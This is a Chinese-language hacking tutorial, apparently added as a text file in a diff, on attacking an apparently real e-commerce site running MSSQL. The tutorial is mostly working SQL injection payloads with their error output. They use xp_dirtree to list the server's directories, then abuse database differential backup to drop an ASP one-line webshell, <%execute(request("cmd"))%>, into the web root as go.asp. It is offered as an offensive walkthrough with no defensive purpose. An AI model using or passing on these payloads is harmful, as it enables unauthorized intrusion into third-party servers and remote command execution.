@@ -1,0 +1,208 @@
+大家晚上好！
+
+继续昨天的教程,手工注入->手工爆目录->手工备份拿shell
+
+大牛就不用看了，别笑话俺了...
+
+pangolin只能报到一级目录，再下去就出不来了，不过有个办法就是不让他删了他的表，再去爆他pangolin_test_table这个表。就能看到内容了。
+再看下啊D：
+看到没，效果就是这样的。
+....
+别问我为什么不爆表进后台，因为今天主要讲手工爆目录->手工备份拿shell
+这个站的表要想猜到admin在哪个表还不好找。
+
+手工爆目录：
+第一步：
+没有20%看起来好看些。
+建表： ;drop table pangolin_test_table;create table pangolin_test_table([id] [int] identity (1,1) not null,[name] [nvarchar] (300) not null,[depth] [int] not null,[isfile] [nvarchar] (50) null);-- 
+
+把盘目录读入表中： ;declare @z nvarchar(4000) set @z=0x64003a005c00 insert pangolin_test_table execute master..xp_dirtree @z,1,1--
+                                              替换这里的数据就可以     0x64003A005C00B0A200C0AD00B6A100D7A800BCD200C8C800C2F400D4B400B3CC00D0F2005C005700650061006C007400680054007200610069006E00                  
+判断几个文件和目录：     and (select cast(count(1) as varchar(8000))%2bchar(94) from pangolin_test_table)=0--
+     
+读表：																				
+																							     N
+ and 0%3C(select top 1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from pangolin_test_table where id not in (select top 2 id from pangolin_test_table order by id) order by id)--
+
+
+1表示是文件。0是目录。
+'0^叶成剑作业'
+0^电子商务网站' 0表示是目录
+'0^阿拉丁专家热卖源程序'   这个就是站点目录我试过了。就不再爆下去了，我找提权了。
+
+top%204  top%204就是top 5
+
+D:\阿拉丁专家热卖源程序\WealthTrain   站点目录就在这个地方。
+
+但是再爆D:\阿拉丁专家热卖源程序\WealthTrain  这个子目录的时候是读不出来的
+用下面这句读不出来，只能读出一个。我们来试试，这就是为什么穿山甲爆不出来了原因。
+and 0%3C(select top 1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from pangolin_test_table where id not in (select top 2 id from pangolin_test_table order by id) order by id)--
+
+
+在将 varchar 值 '0^' 转换成数据类型 int 时失败。  没有数据插入进去。我们有另外的语句来插入。
+
+
+ ;declare @z nvarchar(4000) set @z=0x64003A005C00B0A200C0AD00B6A100D7A800BCD200C8C800C2F400D4B400B3CC00D0F2005C00 insert pangolin_test_table execute master..xp_dirtree @z,1,1--
+
+读取：
+ and 0%3C(select top 1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from pangolin_test_table order by id)-- 
+ and 0=(select top 1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from (select distinct top  1 [name],[isfile] from pangolin_test_table group by [name],[isfile] order by [isfile]) t order by [isfile] desc,[name] desc)--
+ and 0%3C(select top 1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from pangolin_test_table where id not in (select top 2 id from pangolin_test_table order by id) order by id)-- 
+
+
+
+
+-------------------------------------------------------------------------------------
+这里少写了一个l  这语句是直接用'来写目录的。'
+;DROP TABLE hongousy;CREATE TABLE hongousy(subdirectory VARCHAR(100),depth VARCHAR(100),[file] VARCHAR(100))  Insert hongousy exec master..xp_dirtree "d:\阿拉丁专家热卖源程序", 1,1--   就是这个目录了哦
+
+ And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From hongousy)=0  --
+
+在将 varchar 值 '|13|' 转换成数  插入了13条数据进去。
+
+
+ And (Select Top 1 char(124)%2BCast([file] as varchar(8000))%2Bsubdirectory%2Bchar(124) From (Select Top 11 [subdirectory],[file] From hongousy ORDER BY [file],[subdirectory]) D ORDER BY [file] desc , [subdirectory] desc)=0  --
+	
+将 varchar 值 '|0bak|' 转 读出了一个，但是不管怎么换top 后面的数据都是一条。 这语句只能爆出一条记录。那怎么办呢，我刚才提到过就是用常规爆表的方法。昨天学过的语句，先读objects-id
+-----------------------------------------------------------------------------------------------
+
+
+ and (select top 1 cast([id] as nvarchar(20))%2bchar(94)  from [aldneiyi].[sys].[sysobjects] where name=0x68006F006E0067006C006F00750073007900)%3E0--
+ok!  将 nvarchar 值 object_id=676197459^
+
+and (select cast(count(1) as varchar(10))%2bchar(94) from [aldneiyi].[sys].[all_columns] where object_id=676197459)%3E0--
+
+有三列：为什么是三列呢，我们上面建的表就是三个列。
+
+ and (select top 1 cast(name as varchar(500)) from (select top 1 column_id,name from [aldneiyi].[sys].[all_columns] where object_id=532196946 order by column_id) t order by column_id desc)%3E0--
+
+subdirectory
+depth
+file
+
+先看下有几条记录。应该是13刚才查过了。
+ and (select cast(count(1) as varchar(8000))%2bchar(94) from [aldneiyi]..[hongousy] where 1=1)%3E0-- 
+将 varchar 值 '13^' 转换成数据类型 int 时失败
+
+直接爆内容：
+ and (select top 1 isnull(cast([subdirectory] as nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([depth] as nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([file] as nvarchar(4000)),char(32)) from aldneiyi..hongousy where 1=1 and subdirectory not in (select top 4 subdirectory from aldneiyi..hongousy where 1=1 group by subdirectory))%3E0 and 1=1
+
+
+-----------------------------------------------------------------------------------------
+ 'aldshophuangjun.bak^1^1' 转
+ nvarchar 值 'Model^1^0' 转换成数据类型 
+值 'bak^1^0' 转换成数据类型 int 时失败
+值 'Component^1^0' 
+值 'mssccprj.scc^1^1' 转换成数据类型 int 时失败
+值 'Temp^1^0' 转
+ 'WealthTrain^1^0' 转  就是这个目录下了。再爆下级目录方法也是一样的。只要编码下就行了。
+
+
+
+目录找到了，接下来我们怎么拿他的shell呢。注意是db权限下，sa当然也是可以了。哈...
+
+手工备份：  我们备份他的数据裤日志来拿shell
+第一步：;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x686F6E676C6F757379 backup database @a to disk=@s-- 
+          declare 定议 @a 变量
+第二步：;Drop table [honglousy];create table [dbo].[honglousy] ([cmd] [image])--  删表，建表
+
+第三步：;insert into honglousy(cmd) values(0x3C256578656375746528726571756573742822636D64222929253E)--     <%execute(request("cmd"))%> 一句话森木马：
+             ';' 附近有语法错误。 实际上是成攻的
+
+第四步：;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x643A5CB0A2C0ADB6A1D7A8BCD2C8C8C2F4D4B4B3CCD0F25C5765616C7468547261696E5C676F2E617370 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--
+
+第五步：;Drop table [honglousy]-- 
+
+
+
+直接上服务器上去看下，直观点。
+
+
+D:\阿拉丁专家热卖源程序\WealthTrain\go.asp
+成功了吧。
+我们再来一遍，要不有要还会说我先放上去的。。。
+
+现在删掉了。ok再去看下  有了。怎么利用，就是用一句话木马连接端连接。
+
+
+
+
+好了，教程就到这他。8888
+
+
+
+补充点看工具备份的。
+
+
+创建临时表失败!
+执行sp_makewebtask失败!
+
+啊D还成攻上传了。
+
+晕，只能传到C盘下。好了，就这样吧。88
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
